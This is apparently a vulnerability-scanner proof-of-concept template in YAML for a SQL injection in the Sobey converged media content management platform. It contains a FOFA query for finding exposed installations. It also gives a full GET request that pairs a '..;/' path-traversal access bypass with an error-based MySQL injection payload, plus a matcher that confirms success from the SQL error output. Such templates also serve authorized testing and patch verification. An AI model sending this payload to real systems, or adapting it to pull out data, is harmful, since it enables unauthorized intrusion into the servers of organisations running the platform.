id: poc-yaml-sobey-imcmp-articleexamineexport-sqli
info:
  name: 索贝融合媒体内容管理平台 articleExamineExport SQL注入漏洞
  severity: high
  tags:
  - sql-injection
  finger: 索贝融合媒体内容管理平台
  fofa: body="/Sc-TaskMonitoring/" || header="Sobey"
variables:
  t1: random_int(1000,10000)
  t2: md5(t1)
requests:
- method: GET
  path: /sobey-mchEditor/js/..;/mch/Articlelist/articleExamineExport?siteCode=1&status=1+AND+GTID_SUBSET(CONCAT(0x7e,(SELECT+(ELT(1944=1944,md5({{.t1}})))),0x7e),1944)&token=1&createStartTime=1&endStartTime=10
  expression: status_code == 500 && contains(body,"Sobey") && contains(body,".articleScorelistExport")
    && contains(body,`~` + t2 + `~`) && contains(body,"java.sql.SQLException")
transport: http
